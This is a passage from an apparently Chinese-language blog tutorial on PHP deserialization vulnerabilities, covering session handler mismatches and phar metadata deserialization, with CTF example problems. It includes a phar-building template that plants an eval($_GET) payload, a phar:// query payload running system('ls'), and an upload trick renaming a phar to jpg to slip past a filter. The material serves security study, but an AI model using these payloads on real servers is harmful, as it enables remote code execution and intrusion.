+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$a</span> = new <span class="hljs-built_in">test</span>();<br><span class="hljs-variable">$a</span>-&gt;enter = &amp;<span class="hljs-variable">$a</span>-&gt;secret;<br></code></pre></td></tr></table></figure>
+
+<p>这里就相当于a对象中的成员属性enter的值引用了a对象中成员属性secret的值，所以当secret的值改变的时候，enter依然与enter相同</p>
+<p>例题：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-42.png"></p>
+<p>payload构造：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-43.png"></p>
+<h1 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h1><p><strong>session</strong></p>
+<p>当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为&#x2F;tmp）。</p>
+<p>存取数据的格式有多种，常用的有三种</p>
+<p>漏洞产生：写入格式和读取格式不一致</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-44.png"></p>
+<p>当网站序列化并存储session，与反序列化并读取session的方式不同，就可能导致session反序列化漏洞的产生</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-45.png"></p>
+<h2 id="session反序列化漏洞例题"><a href="#session反序列化漏洞例题" class="headerlink" title="session反序列化漏洞例题"></a>session反序列化漏洞例题</h2><p>题目：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-46.png"></p>
+<p>这题思路就是我们要触发__wakeup魔术方法才能得到flag，但是页面没有反序列化来触发，所以可以利用hint.php文件<br>因为hint.php声明的session存储格式为php_serialize，而题目使用的是默认的php格式，所以默认页面以php格式处理session读取时就会触发漏洞</p>
+<p>构造思路：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-47.png"></p>
+<h1 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h1><h2 id="什么是phar"><a href="#什么是phar" class="headerlink" title="什么是phar"></a>什么是phar</h2><p>JAR是开发java程序一个引用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单</p>
+<p><code>**like a java JAR,but for PHP**</code></p>
+<p><strong>PHAR（”Php ARchive”）是PHP里类似于JAR的一种打包文件。</strong></p>
+<p><strong>对于PHP 5.3 或更高版本，Phar后缀文件时默认开启支持的，可以直接使用它。</strong></p>
+<p><strong>文件包含：phar伪协议，可读取 .phar文件</strong></p>
+<hr>
+<h2 id="phar结构"><a href="#phar结构" class="headerlink" title="phar结构"></a>phar结构</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-48.png"></p>
+<p><strong>第一部分</strong>：</p>
+<p><strong>stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;; （头部信息）</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-49.png"></p>
+<hr>
+<p><strong>第二部分：重点关注</strong></p>
+<p><strong>manifest 压缩文件的属性等信息，以序列化存储;</strong></p>
+<p><strong>phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar:&#x2F;&#x2F;伪协议解析phar文件时就会将数据反序列化</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-50.png"></p>
+<hr>
+<p><strong>content 压缩文件的信息</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-51.png"></p>
+<hr>
+<p><strong>signature签名，放在文件末尾</strong></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-52.png"></p>
+<hr>
+<h2 id="phar漏洞原理"><a href="#phar漏洞原理" class="headerlink" title="phar漏洞原理"></a>phar漏洞原理</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-53.png"></p>
+<h2 id="phar文件构造模版"><a href="#phar文件构造模版" class="headerlink" title="phar文件构造模版"></a>phar文件构造模版</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    所需代码；<br>    &#125;<br>    <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;test.phar&#x27;</span>);	<span class="hljs-comment">//删除之前的test.phar文件（如果有）</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;test.phar&quot;</span>); <span class="hljs-comment">//创建一个phar对象，文件名必须以phar为后缀</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();	<span class="hljs-comment">//开始写文件</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); 	<span class="hljs-comment">//写入stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$o</span> -&gt; output=<span class="hljs-string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;	<span class="hljs-comment">//写入要执行的命令，给output成员属性赋值</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); 	<span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;text.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); 	<span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>然后在有反序列化漏洞的页面构造payload</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">?<span class="hljs-keyword">filename</span>=phar://test.phar<span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-54.png"></p>
+<p>命令成功执行</p>
+<hr>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-55.png"></p>
+<h2 id="phar使用条件"><a href="#phar使用条件" class="headerlink" title="phar使用条件"></a>phar使用条件</h2><ol>
+<li><strong>phar文件能上传到服务器端；（后缀名不论，只要上传上去就行）</strong></li>
+<li><strong>要有可用反序列化魔术方法作为跳板；</strong></li>
+<li><strong>要有文件操作函数，如file_exists()，fopen()，file_get_contents()</strong></li>
+<li><strong>文件操作函数参数可控，且：、&#x2F;、phar等特殊字符没有被过滤</strong></li>
+</ol>
+<h2 id="phar反序列化例题"><a href="#phar反序列化例题" class="headerlink" title="phar反序列化例题"></a>phar反序列化例题</h2><p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-56.png"></p>
+<p>题目解析：</p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-57.png"></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-58.png"></p>
+<p><img src="/../image/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-59.png"></p>
+<p><strong>然后修改后缀为jpg上传（因为过滤了phar后缀）</strong></p>
+<p><strong>最后使用md5_file函数和phar伪协议去读取我们上传的文件就能触发反序列化了。</strong></p>
+<p><strong>payload</strong></p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">post</span>方法<br><span class="hljs-keyword">file</span>=phar:<span class="hljs-comment">//upload/test.jpg</span><br></code></pre></td></tr></table></figure>
+
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
